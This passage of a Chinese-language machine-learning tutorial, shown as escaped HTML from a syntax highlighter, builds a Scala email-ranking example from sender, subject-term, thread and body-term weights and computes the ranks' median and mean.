class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06137a369062474-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sortBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06137a369062474-26&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;stopWords&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0044 seconds] --&gt;
&lt;p&gt;给定这段代码，我们就得到了一张列表 filteredThreadTermWeights，该列表基于已有邮件会话中的权重列出了一些关键词。这些权重可以用来计算新邮件的主题的权重，即使这封邮件不是对已有会话的回复。&lt;/p&gt;
&lt;p&gt;对于第四个特征，我们打算合并考虑在所有邮件中出现频率很高的词汇的权重。为此，我们要创建一个 &lt;a href=&quot;http://en.wikipedia.org/wiki/Document-term_matrix&quot;&gt;TDM&lt;/a&gt;，不过这一次和前一个例子中的有点不同，这次，我们只将所有文档中的词汇频率取对数。此外，我们还要对出现率取 log10 函数。这么做可以缩小词汇频率的比例，防止结果被可能的异常值影响。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d06137e284530119&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
val tdm = trainingData
      .flatMap(x =&amp;gt; x.body.split(&quot; &quot;))
      .filter(x =&amp;gt; x.nonEmpty &amp;amp;&amp;amp; !stopWords.contains(x))
      .groupBy(x =&amp;gt; x)
      .map(x =&amp;gt; (x._1, Math.log10(x._2.length + 1)))
      .filter(x =&amp;gt; x._2 != 0)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06137e284530119-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06137e284530119-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06137e284530119-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06137e284530119-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06137e284530119-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06137e284530119-6&quot;&gt;6&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06137e284530119-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;tdm&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;trainingData&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06137e284530119-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;flatMap&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06137e284530119-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;nonEmpty&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;stopWords&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06137e284530119-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;groupBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06137e284530119-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;log10&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06137e284530119-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0020 seconds] --&gt;
&lt;p&gt;这个 TDM 列表可以帮助我们根据历史数据计算新邮件正文的权重，这个权重很重要。&lt;/p&gt;
&lt;p&gt;准备了这 4 个特征之后，我们就可以对训练数据做实际的排序计算。为此，我们要计算出每封邮件的 senderWeight （代表发送人的权重）、termWeight （代表主题词汇的权重）、threadGroupWeight （代表邮件会话的权重）以及 commonTermsWeight （代表邮件正文的权重），并将它们相乘以得到最后的排序。由于我们是做乘法而不是加法，我们需要小心那些小于1的数值。例如，有人发送了一封邮件，那么其 sengerWeight 就是 0.69，若将其与那些还未发送过任何邮件的人作比较就会不公平，因为对方的 senderWeight 值是 1。因此，对于那些数值可能低于 1 的各个特征，我们取函数 Math.max(value,1)。我们来看看代码：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d061381091724139&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
    val trainingRanks = trainingData.map(mail =&amp;gt; {

      //Determine the weight of the sender, if it is lower than 1, pick 1 instead
      //确定发送人的权重，如果小于1，则设为1
      //This is done to prevent the feature from having a negative impact
      //这是为了防止特征出现负面影响
      val senderWeight = mailsGroupedBySender
        .collectFirst { case (mail.sender, x) =&amp;gt;  Math.max(x,1)}
        .getOrElse(1.0)

      //Determine the weight of the subject
      //确定主题的权重
      val termsInSubject = mail.subject
        .replaceAll(&quot;[^a-zA-Z ]&quot;, &quot;&quot;)
        .toLowerCase.split(&quot; &quot;)
        .filter(x =&amp;gt;    x.nonEmpty &amp;amp;&amp;amp;
        !stopWords.contains(x)
        )

      val termWeight = if (termsInSubject.size &amp;gt; 0)
        Math.max(termsInSubject
          .map(x =&amp;gt; {
          tdm.collectFirst { case (y, z) if y == x =&amp;gt; z}
            .getOrElse(1.0)
        })
          .sum / termsInSubject.length,1)
      else 1.0

      //Determine if the email is from a thread,
      //and if it is the weight from this thread:
      //判断邮件是否来自一个会话，如果是，其在该会话的权重:
      val threadGroupWeight: Double = threadGroupedWithWeights
        .collectFirst { case (mail.subject, _, _, weight) =&amp;gt; weight}
        .getOrElse(1.0)

      //Determine the commonly used terms in the email and the weight belonging to it:
      //确定邮件中的常用词汇及其权重:
      val termsInMailBody = mail.body
        .replaceAll(&quot;[^a-zA-Z ]&quot;, &quot;&quot;)
        .toLowerCase.split(&quot; &quot;)
        .filter(x =&amp;gt;    x.nonEmpty &amp;amp;&amp;amp;
        !stopWords.contains(x)
        )

      val commonTermsWeight = if (termsInMailBody.size &amp;gt; 0)
        Math.max(termsInMailBody
          .map(x =&amp;gt; {
          tdm.collectFirst { case (y, z) if y == x =&amp;gt; z}
            .getOrElse(1.0)
        })
          .sum / termsInMailBody.length,1)
      else 1.0

      val rank =    termWeight *
        threadGroupWeight *
        commonTermsWeight *
        senderWeight

      (mail, rank)
    })

    val sortedTrainingRanks = trainingRanks
      .sortBy(x =&amp;gt; x._2)
    val median = sortedTrainingRanks(sortedTrainingRanks.length / 2)._2
    val mean =  sortedTrainingRanks
      .map(x =&amp;gt; x._2).sum /
                sortedTrainingRanks.length&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-44&quot;&gt;44&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-45&quot;&gt;45&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-46&quot;&gt;46&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-47&quot;&gt;47&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-48&quot;&gt;48&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-49&quot;&gt;49&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-50&quot;&gt;50&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-51&quot;&gt;51&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-52&quot;&gt;52&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-53&quot;&gt;53&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-54&quot;&gt;54&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-55&quot;&gt;55&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-56&quot;&gt;56&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-57&quot;&gt;57&lt;/div&gt;
